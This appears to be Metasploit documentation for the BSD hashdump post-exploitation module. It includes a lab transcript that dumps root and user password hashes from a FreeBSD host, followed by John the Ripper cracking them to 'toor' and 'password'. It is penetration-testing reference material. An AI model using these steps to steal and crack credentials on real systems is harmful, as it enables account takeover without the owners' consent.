## Verification Steps

  1. Start msfconsole
  2. Get a session via exploit of your choice
  3. Do: `use post/bsd/gather/hashdump`
  4. Do: `set session <session>`
  5. Do: `run`
  6. You should see password hashes


## Options

  **SESSION**

  Which session to use, which can be viewed with `sessions -l`


## Scenarios

### FreeBSD 11.1-RELEASE-i386

  ```
  msf5 > use post/bsd/gather/hashdump 
  msf5 post(bsd/gather/hashdump) > set session 1
  session => 1
  msf5 post(bsd/gather/hashdump) > set verbose true
  verbose => true
  msf5 post(bsd/gather/hashdump) > run

  [!] SESSION may not be compatible with this module.
  [+] passwd saved in: /root/.msf4/loot/20191027022955_default_172.16.191.175_passwd_886442.txt
  [+] master.passwd saved in: /root/.msf4/loot/20191027022956_default_172.16.191.175_master.passwd_603685.txt
  [+] root:$6$qHMkv01VUXi9UCIK$ReQbxn2vo/i/nnHHtdw3U8BS0IpPRjJmFS6mYPPAkrqP5bHn1m2ReWiRpfEpHbEtAik6rHGpwdF7jaVZwiq22/:0:0:Charlie &:/root:/bin/csh
  [+] user:$6$0De1rFoA/9y9ZNs/$0w33L7Iox0MGMleEF0mndGGxQ.xKAtWzEo5pzLrN35EonLTnb.NWuHVVbpUQS4aSY0pB2gfi9UXj5zUw2Y7Ds0:1001:1001:user:/home/user:/bin/sh
  [+] Unshadowed Password File: /root/.msf4/loot/20191027022956_default_172.16.191.175_bsd.hashes_729820.txt
  [*] Post module execution completed
  msf5 post(bsd/gather/hashdump) > creds
  Credentials
  ===========

  host  origin          service  public  private                                                                                                     realm  private_type        JtR Format
  ----  ------          -------  ------  -------                                                                                                     -----  ------------        ----------
        172.16.191.175           root    $6$qHMkv01VUXi9UCIK$ReQbxn2vo/i/nnHHtdw3U8BS0IpPRjJmFS6mYPPAkrqP5bHn1m2ReWiRpfEpHbEtAik6rHGpwdF7jaVZwiq22/         Nonreplayable hash  sha512,crypt
        172.16.191.175           user    $6$0De1rFoA/9y9ZNs/$0w33L7Iox0MGMleEF0mndGGxQ.xKAtWzEo5pzLrN35EonLTnb.NWuHVVbpUQS4aSY0pB2gfi9UXj5zUw2Y7Ds0         Nonreplayable hash  sha512,crypt
  
  msf5 post(bsd/gather/hashdump) >
  ```

### Crack Hashes (John the Ripper)
  
  The stored file can then have a password cracker used against it. In this scenario, we'll use john (the ripper).

  ```
  # john /root/.msf4/loot/20191027022956_default_172.16.191.175_bsd.hashes_729820.txt
  Using default input encoding: UTF-8
  Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
  Cost 1 (iteration count) is 5000 for all loaded hashes
  Proceeding with single, rules:Single
  Press 'q' or Ctrl-C to abort, almost any other key for status
  Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 1 candidate buffered for the current salt, minimum 8 needed for performance.
  toor             (root)
  Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 3 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 5 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 4 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 6 candidates buffered for the current salt, minimum 8 needed for performance.
  Warning: Only 7 candidates buffered for the current salt, minimum 8 needed for performance.
  Almost done: Processing the remaining buffered candidate passwords, if any.
  Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
  password         (user)
  2g 0:00:00:00 DONE 2/3 (2019-10-27 02:40) 2.898g/s 1482p/s 1484c/s 1484C/s 123456..john
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed
  ```

